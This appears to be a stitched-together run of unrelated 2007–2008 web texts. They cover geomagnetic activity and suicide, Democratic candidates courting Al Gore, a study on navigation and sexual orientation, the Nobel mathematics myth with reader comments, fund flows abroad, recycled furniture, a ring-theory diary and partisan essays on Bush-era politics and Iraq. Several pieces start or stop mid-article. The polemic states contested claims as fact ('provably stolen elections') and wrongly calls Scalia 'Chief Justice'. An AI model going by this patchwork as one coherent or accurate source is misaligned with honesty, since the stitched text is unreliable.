Environmental cue ?
“ The most plausible explanation for the association between geomagnetic activity and depression and suicide is that geomagnetic storms can desynchronise circadian rhythms and melatonin production , ” says Kelly Posner , a psychiatrist at Columbia University in the US .
The pineal gland , which regulates circadian rhythm and melatonin production , is sensitive to magnetic fields .
“ The circadian regulatory system depends upon repeated environmental cues to [ synchronise ] internal clocks , ” says Posner .
“ Magnetic fields may be one of these environmental cues . ”
Geomagnetic storms could disrupt body clocks , precipitating seasonal affective disorder and therefore increase suicide risk , Posner told New Scientist .
There seems little doubt that the brain responds to electromagnetic fields – coils that generate electromagnetic fields can trigger muscular twitches when placed over a person ’s skull .
However , Shumilov , who was presenting his data at the European Geoscience Union ( EGU ) annual meeting in Vienna , Austria , last week , does not believe geomagnetic activity influences everyone equally .
Suicide statistics
He also presented hospital data from 6000 pregnant women who had routine scans of their fetus ’s heart rates between 1995 and 2003 .
In 15 % of the fetuses , periods of disturbances in their heart rates coincided with periods of high geomagnetic activity .
Shumilov accepts that light levels in northern countries can influence depression , but believes that geomagnetism may be another factor , and one that is under - appreciated .
The trouble with studying the causes of suicide is that it is a rare condition , says Klaus Ebmeier , a psychiatrist at the University of Oxford .
“ You are bound to get spurious effects .
A study of the causes would have to enrol a country ’s entire population . ”
Cosmo Hallstrom , a member of the Royal College of Psychiatrists , agrees .
“ You have to be very careful with suicide statistics , ” he says .
“ Countries report them differently .
Catholic countries are very reluctant to diagnose suicide .
Scandinavian countries consider it a social injustice not to . ”

WASHINGTON ( Reuters ) - Democratic
White House hopefuls Hillary Clinton and Barack Obama speak often about green jobs , emissions cuts and renewable energy .
But they have more than global warming on their minds when they talk of environmental policy .

The long - term goal may be saving the planet , but the short - term one is winning the backing of former Vice President Al Gore .
Gore , who won a Nobel prize for his work to combat rising temperatures , is also a superdelegate , one of the influential Democratic Party leaders likely to determine whether Obama , an Illinois senator , or Clinton , a New York senator , wins the party ’s presidential nomination .
So the dueling candidates praise Gore during campaign stops , offer up the prospect of roles for him in future administrations , and -- most of all -- they stay in touch .
“ They both call .
And I appreciate that fact , ” Gore said on the CBS television program “ 60 Minutes ” last week .
Obama , the Democratic front - runner , says he keeps in regular contact with Gore and has pledged to make him a major player on global warming in an Obama administration .
“ I will make a commitment that Al Gore will be at the table and play a central part in us figuring out how we solve this problem , ” Obama said .
Clinton told reporters she did not know whether Gore wanted to get back into government but was sure the American people would welcome it .
“ I am very dependent upon the work that Al Gore has done for so many years on behalf of climate change , ” she said .
Gore ’s spokeswoman , Kalee Kreider , declined to comment on the Obama offer and was complimentary about the presidential candidates , including Republican Sen. John McCain of Arizona .
“ Former Vice President Gore thinks that both candidates are very strong .
Both of them have offered plans to address the climate crisis ... as has Senator McCain , ” she said .
“ It ’s a real turnaround to have candidates on both sides of the aisle offering , you know , solutions and plans to the climate crisis . ”
REAL CHANGE
Gore , who narrowly lost the 2000 election to George W. Bush , has dedicated most of his professional life since then to fighting climate change .
Although he may not be eager to get back into the political fray , he has an agenda : to put fighting global warming on the top of the next president ’s to - do list .
That should n’t be too hard .
All three candidates have made climate proposals that go far beyond Bush ’s policies , including a cap on industrial carbon dioxide pollution and an emissions trading system similar to the European Union’s .
“ The most important role that Vice President Gore plays for all candidates is to raise the bar very high on what needs to be done to solve this critical problem , ” said Gene Karpinski , president of the League of Conservation Voters .
Keeping the issue prominent on the campaign trail will give the next U.S. president a mandate to put new policies into place , he said .
The candidates discuss the issue regularly at rallies and town hall meetings , where lines about global warming often draw applause , especially from Democratic audiences .
Environmentalists say a new president , armed with the right policies and a cooperative Congress , could make Washington an influential leader in talks to form an international climate treaty to succeed the Kyoto Protocol , which goes through 2012 and which the United States has not ratified .
But for any new U.S. policies to succeed , American citizens will have to be engaged , a problem Gore aimed to address with a newly launched $ 300 million climate campaign .
Obama talks about the need for an attitude adjustment among Americans and boasts of a trip he made to Detroit , where he admonished car makers to make more fuel efficient vehicles .
Clinton says she would promote “ green - collar ” employment to replace lost manufacturing jobs around the country .
McCain says even if global warming is not real , working to stop it will have beneficial effects .
The talk has attracted the attention of environmentalists and policy makers around the world who see a chance for a significant shift in U.S. climate policy starting in 2009 .
“ Everybody in Europe is watching the election very closely , ” said Mahi Sideridou of the environmental group Greenpeace in Brussels .
“ No matter which party wins ... we ’re pretty sure that we ’re going to see a huge shift in policy making in climate change . ”
Gay men navigate in a similar way to women , according to a new study from researchers at Queen Mary , University of London .
Dr Qazi Rahman , from Queen Mary ’s School of Biological and Chemical Sciences used virtual reality scenarios to investigate if spatial learning and memory in humans can be linked to sexual orientation .
Differences in spatial learning and memory ( our ability to record and recall information about our environment ) are common between men and women .
It has been shown that men consistently outperform women on tasks requiring navigation and discovering hidden objects ; whereas women are more successful at tests which require them to remember where those objects lie in a particular space .
This is the first study to investigate if those differences are also true for gay , lesbian and straight individuals .
Dr Rahman used virtual reality stimulations of two common tests of spatial learning and memory , designed by researchers at Yale University .
In the Morris Water Maze test ( MWM ) , participants found themselves in a virtual pool and had to escape as quickly as possible using spatial clues in the virtual room to find a hidden platform .
In the Radial Arm Maze test ( RAM ) , participants had to traverse eight ‘ arms ’ from a circular junction to find hidden rewards .
Four of the arms contained a reward , four did not .
Dr Rahman and his research assistant , Johanna Koerting , found that during the MWM test gay men and straight women took longer to find the hidden platform than did straight men .
However , both gay and straight men spent more of their “ dwelling time ” in the area where the hidden platform actually was , compared to straight and lesbian women .
Dr Rahman explains : “ Not only did straight men get started on the MWM test more quickly than gay men and the two female groups , they also maintained that advantage throughout the test .
This might mean that sexual orientation affects the speed at which you acquire spatial information , but not necessarily your eventual memory for that spatial information .
“ In previous studies we have also found that gay men tend to use similar navigation strategies to women , like using land - marks , and we now want to explore whether navigation strategies on these virtual navigation tasks are also the same for gay men and women .
In particular , we are interested in whether heterosexual men are using a unique strategy from their first attempt at traversing a new environment , which accounts for why they are so quick off the mark . ”
The researchers also found that gay and straight men were similar in their performance on the Radial Arm Maze .
“ This suggests that sexual variation in spatial cognition is not straightforward – gay people appear to show a ‘ mosaic ’ of performance , parts of which are male - like and other parts which are female - like , ” adds Rahman .
Dr Rahman also commented that it would be interesting to see if these sexual differences change with age .
“ We know that spatial ability declines more rapidly in men with age than in women , and this might be related to changing hormone profiles .
This may have some relevance to sex differences in ageing - related diseases of cognitive functioning , such as dementia .
“ If we can understand more about how people of different sexes and sexualities differ in spatial performance , we might be able to tailor cognitive remediation therapies more effectively to specific groups within an ageing population . ”
This research was recently published in the journal Hippocampus .

Back in October 2007 , Clinton was beating Obama in Maine by a hilarious 47 to 10 margin , but it seems he 's carried the state today , once again by a large margin .
My understanding , though , is that this does n't really count because it's a small state , much as Utah does n't count because there are n't many Democrats there , DC does n't count because there are too many black people , Washington does n't count because it's a caucus , Illinois does n't count because Obama represents it in the Senate even though Hillary was born there , Hawaii wo n't count because Obama was born there .
I 'm not sure why Delaware and Connecticut do n't count , but they definitely do n't .
Realistically , Clinton seems to have difficulty winning anywhere she can't mobilize racial polarization in her favor .
Obama has , of course , deployed polarization to his benefit in a number of states ( South Carolina , Georgia , Alabama , and Louisiana most notably ) but he's also dominated the states with very few black voters .
UPDATE : I forgot about Missouri .
Obama 's win in Missouri , of course , does n't count because the state was called too late .

From Gene Expression :
There are certain things which are sacred , certain lines you do n’t cross . …
I was thinking about [ this ] a few months ago when I read Rome & Jerusalem : A Clash of Ancient Civilizations and God ’s Rule – Government and Islam .
You see , the ancient Romans and Muslims did not have kings .
Kings were tyrants , and the early Roman and Islamic polities rejected such tyranny on principle .
So of course , instead of kings , the Roman Empire was headed by an emperor , while the Muslims had caliphs .
Get it ?
When Augustus defeated Mark Antony and Cleopatra the official narrative was that the doughty republican traditions of Rome had bested once more the oriental despotism of the Hellenistic world , with their Greek kings and queens .
Similarly , the righteous AbbasidsUmayyads .
In its place they established a genuine Islamic state which was guided by the traditions of the community as opposed to profane naked autocracy .
Right ….
As you can see here , the extent of the self - deception and semantic delusion is really humorous .
Now , it is true that the early emperors of Rome tended to keep up the illusion that they were simply stewards of the Roman Republic with some verisimilitude .
Augustus ’ shtick was that his was a restorationist project ; he was no dictator or king , just the First Citizen .
Similarly , the early Abbasids were ostensibly bringing the vision of the Islamic community to its true fulfillment ( especially the Shia party ) , whereas the Umayyads had been worldly Arab tribalists more in keeping with the values of the jahiliya .
…
Muslim soldiers were enraged and shocked when the conqueror of Spain allowed his Visigothic wife to convince him to don a crown and so indicate kingship ; they accused him of becoming a Christian .
Why is there no Nobel Prize in Mathematics ?
brought to you by The Nobel Prize Internet Archive
Six Nobel Prizes are awarded each year , one in each of the following categories : literature , physics , chemistry , peace , economics , and physiology & medicine .
Notably absent from this list is an award for Mathematics .
The reason for this conspicuous omission has been subject of extensive speculations , some of which are discussed below .
We have also included our visitors responses and commentaries and why they believe Mathematics was not included as a Nobel category .

Afterword :
Not to be left out of the Big Award movement , mathematicians of the world decided to fight back .
At the 1924 International Congress of Mathematicians ( ICM ) in Toronto , a resolution was adopted that at each ICM , two gold medals should be awarded to recognize outstanding mathematical achievement .
A hyperlinked list of all Fields medal laureates is presented here .
In 2002 , the Niels Henrik Abel Memorial Fund was established to award the Abel Prize for outstanding scientific work in the field of mathematics .
The prize amount is 6 million NOK ( about 750,000 Euro ) and was awarded for the first time on 3 June 2003 .
It is awarded yearly by the Norwegian Academy of Science and Letters in March or April .
The storie continues ...
The following information is courtesy the sci.math newsgroup 's FAQ list which can be found in its original form here .
Nobel prizes were created by the will of Alfred Nobel , a notable Swedish chemist .
One of the most common - and unfounded - reasons as to why Nobel decided against a Nobel prize in math is that [ a woman he proposed to / his wife / his mistress ] [ rejected him because of / cheated him with ] a famous mathematician .
Gosta Mittag - Leffler is often claimed to be the guilty party .
There is no historical evidence to support the story .
For one , Mr. Nobel was never married .
There are more credible reasons as to why there is no Nobel prize in math .
Chiefly among them is simply the fact he did n't care much for mathematics , and that it was not considered a practical science from which humanity could benefit ( a chief purpose for creating the Nobel Foundation ) .
Further , at the time there existed already a well known Scandinavian prize for mathematicians .
If Nobel knew about this prize he may have felt less compelled to add a competing prize for mathematicians in his will .
[...]
As professor ordinarius in Stockholm , Mittag - Leffler began a 30 - year career of vigorous mathematical activity .
In 1882 he founded the Acta Mathematica , which a century later is still one of the world 's leading mathematical journals .
Through his influence in Stockholm he persuaded King Oscar II to endow prize competitions and honor various distinguished mathematicians all over Europe .
Hermite , Bertrand , Weierstrass , and Poincare were among those honored by the King . [...]
Source : " The Mathematics of Sonya Kovalevskaya " by Roger Cooke ( Springer - Verlag , New York etc. , 1984 , II.5.2 , p. 90-91 :
Here are some relevant facts :
Nobel never married , hence no ``wife ' ' .
( He did have a mistress , a Viennese woman named Sophie Hess . )
Gosta Mittag - Leffler was an important mathematician in Sweden in the late 19th - early 20th century .
He was the founder of the journal Acta Mathematica , played an important role in helping the career of Sonya Kovalevskaya , and was eventually head of the Stockholm Hogskola , the precursor to Stockholms Universitet .
However , it seems highly unlikely that he would have been a leading candidate for an early Nobel Prize in mathematics , had there been one - there were guys like Poincare and Hilbert around , after all .
There is no evidence that Mittag - Leffler had much contact with Alfred Nobel ( who resided in Paris during the latter part of his life ) , still less that there was animosity between them for whatever reason .
To the contrary , towards the end of Nobel 's life Mittag - Leffler was engaged in ``diplomatic '' negotiations to try to persuade Nobel to designate a substantial part of his fortune to the Hogskola .
It seems hardly likely that he would have undertaken this if there was prior bad blood between them .
Although initially Nobel seems to have intended to do this , eventually he came up with the Nobel Prize idea - much to the disappointment of the Hogskola , not to mention Nobel 's relatives and Fraulein Hess .
According to the very interesting study by Elisabeth Crawford , `` The Beginnings of the Nobel Institution ' ' , Cambridge Univ .
Press , 1984 , pages 52 - 53 : Although it is not known how those in responsible positions at the Hogskola came to believe that a large bequest was forthcoming , this indeed was the expectation , and the disappointment was keen when it was announced early in 1897 that the Hogskola had been left out of Nobel 's final will in 1895 .
Recriminations followed , with both Pettersson and Arrhenius [ academic rivals of Mittag - Leffler in the administration of the Hogskola ] letting it be known that Nobel 's dislike for Mittag - Leffler had brought about what Pettersson termed the ` Nobel Flop ' .
This is only of interest because it may have contributed to the myth that Nobel had planned to institute a prize in mathematics but had refrained because of his antipathy to Mittag - Leffler or - in another version of the same story - because of their rivalry for the affections of a woman ....
However , Sister Mary Thomas a Kempis discovered a letter by R. C. Archibald in the archives of Brown University and discussed its contents in " The Mathematics Teacher " ( 1966 , pp.667-668 ) .
Archibald had visited Mittag - Leffler and , on his report , it would seem that M - L * believed * that the absence of a Nobel Prize in mathematics was due to an estrangement between the two men .
( This at least is the natural reading , but not the only possible one . )
A final speculation concerning the psychological element .
Would Nobel , sitting down to draw up his testament , presumably in a mood of great benevolence to mankind , have allowed a mere personal grudge to distort his idealistic plans for the monument he would leave behind ?
However , the story of some rivalry over a woman is obviously much more amusing , and that 's why it will probably continue to be repeated .

The explanations offered here and on the linked Urban Legends Reference Pages for why there is no Nobel prize in mathematics are a good demonstration of the practical importance of mathematics .
In fact , they are excellent examples of circular logic and inadequate reasoning .
They take the line from Nobel 's bequest , that the prizes should be given " to those who , during the preceding year , shall have conferred the greatest benefit on mankind " , to indicate that Nobel 's interest lay in practical developments , and so mathematics would not qualify .
Yet all this boils down to is the circular thesis that there is no Nobel prize in mathematics because Nobel constructed his will in such a way that there should be no Nobel prize in mathematics .
The contention that any sort of dispute with Mittag - Leffler would be an unlikely reason to leave mathematics out , simply because there were other mathematicians who might win the prize before him , is also inadequate in its reasoning : even if other mathematicians would get it first , that does n't mean that Mittag - Leffler would not have eventually gotten it , and perhaps in short order .
As for the speculation that Nobel would not want to taint such an idealistic endeavour with a personal grudge : from the subjective perspective of the person making the bequest , that is just as good a reason for leaving the mathematics prize out , as it would be , from the external perspective , for putting it in .
So , apart from the partisan complaints of Arrhenius and Pettersson at the time , the only historical evidence bearing on the matter that seems to have been found thus far is the written testimony of Archibald , that Mittag - Leffler at least believed that he and Nobel were estranged .
For the time being then , the truth still lies buried with Nobel .
The real mystery is not why there is no Nobel prize in mathematics , but why there is one - or at least , one administered by the Nobel Foundation - in economics .

My opinion is that the subject " Mathematics " may be the Assisting tool for Science and Technology that is for the banches of Science subjects like Physics and Chemistry , the maths can " help " in calculation for findings or inventions or discoveries .
The maths alone , as per the wills of Nobel , may not discovering anything new for the society .
The ancillary part of maths like statistics or probabily are helped in Economical analysis only , there also mathematics is acting as a calculating tool only .
The above reasons may be thought for NOT including in the Nobel Prize category .

It is either right or wrong and applies correctly for only some applications .
Math unlike literature does n't evoke emotions , but a useful general tool for solving problems .
As long as people push and challenge themselves as well as others to be inventive for the greater of mankind may the world grow together .

The past arguments against a Nobel in Math have already been outstripped due to the very nature of advances in mathematics themselves .
I do n't think Nobel particularly hated math , though he despised statisticians and accountants .
To me , Wiles ' solution to the Fermat deserved a Nobel as did Witten and Greenburg 's application of Conformal and Lie Algebras .
Tanayama and Shimura should have gotten one , Venn should have , too .
New mathematical models for use in a whole range of applications should be recognized .
Pure mathematics is a thing all its own and may even be thought of as an art .
Mandelbrot sets are an example .
It may be right to note that Symbolic Logic , once a part of Philosophy , is now a branch of mathematics all its own .
Then , there are people like Douglas Hofstadter and Martin Gardner that have opened the universe of the love of pure mathematics to millions .
Lets just give the entire Princeton University Dept. of Theoretical Math a couple of Nobels .
Well , I just want to say that Mathematics is the mother of all sciences .
I am just a boy of 16 years old .

I want to be a mathematician and I do n't care to win a Nobel prize .
I want to inform the world that " whatever a person is .... he is himself " .
A person does n't need to show himself infront of the world that he has won a Nobel prize .
I want people to feel their existence .
I want them to think just how do they feel themselves being alive , their sensations , their existence ?

Assuming that it was not a simple oversight I believe that Nobel did not include a prize for mathematics for possibly two reasons : a ) He did not understand the importance of mathematics in the developement of useful technology .
b)
He realized that the mathematics required for most technological developement , rarely more complex than elementary calculus , is trivial and not worthy of recognition .
Andrew Wiles , having proved Fermats " last theorem , " is obviously a remarkable number theorist .
Fermats theorem , and the math used in Wiles proof will probably never prove beneficial in any practical application .
Today , if technology requires a mathematical solution that does n't yield quickly to analytic methods , numerical methods and fast computers are employed .

This more of an editorial concering the article ' Why no math ? ' .
This article supposes that Nobel did n't include Mathematics as a winnable category for reasons including bad relationships or maybe Nobel just did n't like mathematics .
It seems that this article is missing the most reasonable , if not obvious , excuse for not including ' good ol ' arithmetic ' : because mathematics is the base field .
It is a gateway to understanding in each of the 6 fields a prize is given .
Math is inherently present in Physics , Chemistry , Economics , and Medicine .
Maybe not as seeable , but included if you take a closer look , is Mathematics in Literature and definitely a degree of math in the business of Peace as well .
I hope that in the future a broader band of opinion and speculation is given .
For simple logic , as this is , tends to be the most viable and in actuality is more often , mathematically speaking , the truth .
NEW YORK ( CNNMoney.com ) --
Where are investors putting their money in these uncertain times ?
Apparently , more and more are seeking safer havens in Europe , India , China and Latin America .
With recession fears dogging the U.S. markets , stocks had a dismal first quarter .
But according to recent figures from two key research firms that track the mutual fund industry , investors are flocking to overseas markets .
Fund tracker TrimTabs Investment Research reported in its latest weekly report about market liquidity that total inflows into equity mutual funds during the week ended March 26 was $ 7.43 billion .
But of that total , $ 4.4 billion , or nearly 60 % , was invested in funds that mainly invest in non-U.S. stocks .
What 's more , the latest TrimTabs data showed that investors pulled $ 6.9 billion from exchange - traded funds ( ETFs ) that invest in U.S. stocks .
Meanwhile , ETFs that invest in stocks from outside the U.S. reported inflows of $ 831 million .
Demand for overseas investments is certainly reaching a fever pitch .
In fact , British bank Barclays announced Friday that it was listing two new foreign - themed ETFs on the Nasdaq through its popular iShares offerings .
" These new products give investors exposure to a broad range of international economies , " said Noel Archard , head of iShares product development , in a statement .
This trend is a continuation of what happened in the markets last month .
Investors are clearly concerned by a variety of factors that are undermining business confidence in the U.S , , such as rising commodity prices , the moribund dollar and weakening consumer spending .
The Investment Company Institute reported Thursday that inflows into stock funds in February totaled $ 9.5 billion .
But of that amount , $ 5.89 billion , or more than 60 % , went into funds that primarily invest in international stocks .
" The unprecedented diversification process of investing away from equity funds that invest primarily in the U.S. in favor of those that invest globally remains well in place , " wrote Stefane Marion , an assistant chief economist with National Bank Financial in Montreal , in a report Thursday .
To be sure , as the most recent figures show , investors are not completely fleeing the U.S.
But they do n't seem to be showing as much faith in U.S. - based companies either .
Instead , in addition to putting more money to work abroad , investors are also piling into more stable investments .
According to the ICI report , $ 14.9 billion flowed into bond funds in February .
And that 's on top of inflows of $ 24.3 billion in January .
And money market funds reported a whopping $ 92.2 billion in inflows last month - and nearly a quarter of that was from individual investors .
That comes after inflows of $ 160.42 billion in January .
This could be a good sign for the domestic markets in the future though .
Investors are certainly being extra cautious now , but a lot of money could be quickly rotated into stocks if the economy and markets take a turn for the better in the second half of 2008 , as some expect .
Marion points out that 29 % of the net assets in all mutual funds in February were in cash , the highest level since October 2003 .
All that money is sitting on the sidelines due to fears of the U.S. economy deteriorating even further .
But if the Fed 's series of rate cuts since last September and the tax rebate checks that will soon go out to consumers help get the economy back on track ( admittedly , a big if ) , then you 'd have to think that long - term investors will no longer want to keep their money in something that offers as low a return as a bond fund or money - market fund .
Heck , some investors might even decide to look closer to home for some bargain companies to buy instead of focusing as much on international markets .
After all , since many international stocks have already enjoyed big run-ups , now might be a better time to invest in U.S. companies that can also benefit from strong demand overseas .
" People have a rear - view mirror bias .
They are chasing what has worked , " said Brad Thompson , director of strategy and research with Frost Investment Advisors in San Antonio .
" Globalization is important but we are playing it by increasing exposure to high - quality U.S. stocks with a global presence . "
Along those lines , Thompson said his firm , which manages about $ 10 billion in assets , likes Caterpillar ( CAT , Fortune 500 ) , agricultural giant Monsanto ( MON , Fortune 500 ) , Google ( GOOG , Fortune 500 ) and handbag maker Coach ( COH ) .

Do you ever get sick of people telling you to recycle ?
Geeky and green , these furniture designers prove recycling can be a lot more interesting than stuffing cans , bottles and cardboard into the proper containers .
A ‘ bathtub couch ’ and ‘ shopping cart chair ’ may not be your cup of tea but there is something for everyone in this adaptive reuse collection .
Who knows , you might even be inspired to find new uses for old stuff around the house after seeing some of these bizarre recycled furniture designs .
The Castor Canadensis design collective has a solution for folks who are n’t sure what to do with old fluorescent light tubes : use them as light fixtures !
While the design is not overly complex it is rather elegant in its simplicity .
Also , the fixtures are great for diffusing the light and work remarkably well to illuminate an interior living or dining space .
While not exactly ergonomic the adaption of a shopping cart into a chair seems rather reasonable once you see the result : a detailed and structurally - sound seat that bends and gives slightly where needed but also provides a good deal of support and a place to rest one ’s arms .
Still , these and other shopping cart chairs might be better suited to a BBQ setting than to a formal dining set .
Old sports equipment has a way of accumulating .
Some things we outgrow , some things we ‘ replace ’ only to find the originals later behind some pile in the garage .
Instead of discarding all of that stuff why not find a clever way to reuse it ?
Maybe the skateboard table or baseball bat chair are n’t your style but perhaps you know a sports fan in need of a sporty recycled furniture birthday present .
Not every piece of ‘ recycled furniture ’ has to be fancy .
These crushed - can furniture pieces are extremely simple in theory but quite colorful in practice .
They are n’t suited for every interior design scheme but they are robust and would work great for outdoor furniture in a rugged environment .
After all , would anyone really notice the rust on these ?
If you ’ve ever remodeled a bathroom you know just how big and awkward old bathtubs can be and getting one out of the house to be recycled or scrapped is no easy task .
With a few simple modifications the designers over at Reestore have found a way to deal with these clunky relics .
Whether the solution is a potentially romantic love seat or an entirely kitch creation is , of course , in the eye of the beholder .
A dishwasher drum seems an unlikely candidate for reuse until you see this recycled dishwasher drum table in action .
Once transformed , this odd object is surprisingly suited to its new roll as the base of a simple cylindrical side table .
The perforations in the site create interesting lighting patters and the hollow center makes this a light and versatile addition to any home .
Once you smash and bend that bike wheel enough it has nowhere to go but the dumpster , right ?
Wrong if you ’re Andrew Gregg who distorts these seemingly broken pieces even further in the pursuit of a higher goal .
The results clearly show the objects ’ origins but are nonetheless original , dynamic , eye - catching and even useful compositions .
As everything related to computers gets smaller fewer and fewer people need their old CDs , particularly the burned copies of things that are somewhere on hard drive or a iPhone anyway .
Simple reuses for these included coasters and gaudy dangling decorations of course , but the chair above is a pretty compact way to reuse loads of them all at once .
That being said , one has to wonder whether this CD chair could possibly be comfortable .
Not every piece of old clothing is fit for the Salvation Army .
Some things are too full of holes or , well , let ’s face it , too embarrassingly outdated for you to subject even a total stranger to .
With this simple and material - light clothing container furniture you can simply stuff your old clothes ( ideally after one last wash of course ) into a new shape and use as plush and padded furniture .
Newspaper has to be one of the most ubiquitous recyclables on the planet and processing newspapers into reusable materials is itself energy - consuming .
Instead , people with the time and inclination could take a hint from the above design : folding , wrapping and weaving newspaper can create surprisingly strong , naturally variegated and colorful recycled newspaper baskets .
Cleaning out the drawers always seems to turn up a surprising number of throwaway pens .
By the time we get to these many are dried out or otherwise dysfunctional .
Up close it may look tacky but from a distance this disposable pen chandelier has some grace to it .
Plus if you ever needed a pen you ’d at least know where to find one .
Retro is great but for most of us the faked retro items at the local hipster shop are just a bit too contrived .
Lamponi Lamps is the real deal : they use vintage appliances and automobile parts to create elaborate and remarkably elegant lamps .
There is a kind of retrofuturism at work here with an authenticity rarely found in faux - historical interior furnishings .
There are some more great green furniture items and unusually cool recycling projects at Inhabitat and Ecoble as well as some neat recycled art over at CultCase .
" Endomorphism " is not an Elvish word .
Although this diary is not about Tolkien nor rings of power it is nevertheless appropriate to subtitle it " There and back again "
In my previous I found the endomorphism of C 4 and named them Null , Identity , Swap , and Shink .
Now I want to turn them into a ring .
I 'm hoping for some kind of quirky , non-commutative ring to turn up .
The multiplication is by composition of functions .
The multiplication table has 4×4=16 entries .
Composition with Null is obviously Null , whichever way round you do it , which takes care of seven entries , clearly working like zero , as required .
Indentity obviously functions as multiplication by one , so that is another five entries accounted for .
Only four left .
Shrink × Shrink = Null 1 and 3 both get taken to 2 and then to 0 .
This is Null .
Bugger !
A zero divisor .
Zero divisors are bad because they stop you creating a field of fractions .
Swap × Swap = Identity 0 and 2 are left alone .
1 and 3 get swapped and swapped back Swap × Shrink = Shrink Since 1 and 3 both get mapped to 2 , swapping them first does n't matter Shrink × Swap = Shrink Swap is too late to do anything , Shrink has already got rid of 1 and 3 .
Addition is by point wise addition of functions .
For example to calculate Identity + Shrink you go through the set { 0,1,2,3} working out what Identity +
Shrink does to each of them like this
Identity ( 0 ) + Shrink (0 ) =0+0=0
Identity ( 1 ) + Shrink ( 1) =1+2=3
Identity ( 2 ) + Shrink ( 2) =2+0=2
Identity ( 3 ) + Shrink ( 3) =3+2=5=1
So Identity + Shrink=Swap
As I worked through this table , recognition slowly dawned on me .
This was the ring of integers modulo 4 .
Null takes 1 to 0 Identity takes 1 to 1 Shrink takes 1 to 2 Swap takes 1 to 3
My four endomorphisms are multiplication by 0,1,2 , and 3 .
With pointwise addition for addition and composition for multiplication , they play exactly the roles of 0,1,2 , and 3 .
I 've ended up creating the very ring that I started with .
There and back again , indeed !
Think Progress :
Defense Secretary Robert Gates has called CENTCOM commander Adm. William Fallon “ one of the best strategic thinkers in uniform today . ”
Fallon opposed the “ surge ” in Iraq and has consistently battled the Bush administration to avoid a confrontation with Iran , calling officials ’ war - mongering “ not helpful . ”
Privately , he has vowed that an attack on Iran “ will not happen on my watch . ”
Unfortunately , this level - headed thinking and willingness to stand up to President Bush may cost him his job .
According to a new article by Thomas P.M. Barnett in the April issue of Esquire magazine ( on newsstands March 12 ) , Fallon may be prematurely “ relieved of his command ” as soon as this summer :

Not long ago progressives launched a fervent effort to replace Alberto Gonzales as Attorney General .
That effort was bolstered by communications from leading Democratic Party figures urging those concerned by Gonzales ’s politicization and unswerving loyalty to the Cheney - Bush neoconservative junta to petition the White House with e-mails and letters demanding justice .
I was contacted via e-mail by a highly prominent Democratic Party senator enlisting my effort by adding my name and e-mail protest toward this pursuit .
While I had earlier joined in such petition efforts to snowball the prevailing powers , I finally declined for what I believe to be the logical reason that enough misdirected effort had already been dispatched in that direction .
Tyranny begins from the top down , which means Cheney and Bush .
Before the cry was to remove Attorney General John Ashcroft , and thereafter the natural target was Alberto Gonzales .
So now Gonzales is gone and in a lead story in the New York Times today , September 12 , it was revealed that a name high on the list of successors to the recently departed Gonzales is former Solicitor General Theodore Olson .
Olson ’s credentials are interesting and pass the most stringent neoconservative litmus test .
Olson was part of the “ Get Bill Clinton ” lawyer brigade and his deceased wife Barbara wrote a book denouncing Hillary Clinton .
When it was time to marshal forces to challenge American democracy by preventing a recount of votes in Florida in the 2000 presidential election despite the state ’s constitution ’s own clear language of enforcing “ voter intent ” in the wake of machine imperfections , Olson was there to lead the challenge .
That challenge was opposition to counting the votes of Sunshine State citizens who happened to live in poorer districts and were compelled to endure voting at polling stations with old and poorly functioning voting machines .
When the Florida challenge made its way ultimately to the U.S. Supreme Court , Olson and his cronies had ready allies in Chief Justice Antonin Scalia and his alter ego , Associate Justice Clarence Thomas .
All were fellow members of the Federalist Society , a fraternity of lawyers fighting valiantly to push a neoconservative agenda .
Olson and Scalia had another connection as well , one that used to prompt judges to recuse themselves , but then again , these are different times .
Olson represented the same law firm where Scalia ’s son was employed .
Scalia saw no problem .
After all , this was the same Chief Justice who later would go duck hunting with Dick Cheney when an important case involving the Bush Administration was waiting to be resolved .
Federalist Society brothers Scalia and Thomas rode to the rescue on that occasion to save America from installing in office the candidate who secured the most popular votes and , without judicial interference , would have become President , then Vice President Al Gore .
Scalia and Thomas made a judicially hypocritically U - turn to prevent Florida from enforcing its own election laws by conducting a recount .
They had previously enunciated staunch states rights views on issues pertaining to federal involvement .
Brother Olson and his team secured a 5 - 4 victory thanks to Scalia and Thomas .
So Theodore Olson is ideally qualified to serve as Attorney General under a neoconservative regime in which the law is whatever Cheney and Bush proclaim it to be at any given moment .
Can anyone realistically expect Bush to yield to Democratic Party recommendations and select anyone other than a roaring partisan of the Olson stripe ?
Does anyone believe that a modern day Daniel Webster or Clarence Darrow will emerge and be championed by Bush and Cheney ?
In the New York Times September 12 story Senator Charles Schumer revealed disappointment over the prospect of an Olson selection , saying , “ My hope is that the White House would seek some kind of candidate who would be broadly acceptable . ”
Think of what Democratic Senator Charles Schumer of New York said !
Can he be serious ?
Do Cheney and Bush seek “ broadly acceptable ” candidates for any position ?
Senator Schumer , this is the preventive detention gang .
They spy at the realm ’s will , grab people off of the streets anywhere in the world , and torture at the regime ’s pleasure .
This regime has achieved White House status based on two provably stolen elections .
This regime launched a war based on provable lies that thus far has killed , according to current estimates , between 600,000 to 1 million human beings .
Get real , Senator Schumer !
Get real , progressives !
Stop launching petition drives to rid America of the latest neoconservative spear carrier .
Get real !
Work toward the impeachment of Cheney and Bush !
( Original Article )
PRESIDENT
George W Bush ’s bold decision to order a “ surge ” of some 20,000 American troops for Iraq has brought the debate over the war to a defining stage .
There will not be opportunity for another reassessment .
The Baker - Hamilton commission has powerfully described the impasse on the ground .
It is the result of cumulative choices — some of them enumerated by the president — in which worthy objectives and fundamental American values clashed with regional and cultural realities .
The important goal of modernising US armed forces led to inadequate troop levels for the military occupation of Iraq .
The reliance on early elections as the key to political evolution , in a country lacking a sense of national identity , caused the newly enfranchised to vote almost exclusively for sectarian parties , deepening historic divisions into chasms .
The understandable — but , in retrospect , premature — strategy of replacing American with indigenous forces deflected US forces from a military mission ; nor could it deal with the most flagrant shortcoming of Iraqi forces , which is to define what the Iraqi forces are supposed to fight for and under what banner .
These circumstances have merged into an almost perfect storm of mutually reinforcing crises : Within Iraq , the sectarian militias are engaged in civil war or so close to it as to make little practical difference .
The conflict between Shias and Sunnis goes back 1,400 years .
In most Middle Eastern countries , Shia minorities coexist precariously with Sunni majorities .
The civil war in Iraq threatens to usher in a cycle of domestic upheavals and a war between Shia and Sunni states , with a high potential of drawing in countries from outside the region .
In addition , the Kurds of Iraq seek full autonomy from both Sunnis and Shias ; their independence would raise the prospect of intervention from Turkey and possibly Iran .
The war in Iraq is part of another war that cuts across the Shia - Sunni issue : the assault on the international order conducted by radical groups in both Islamic sects .
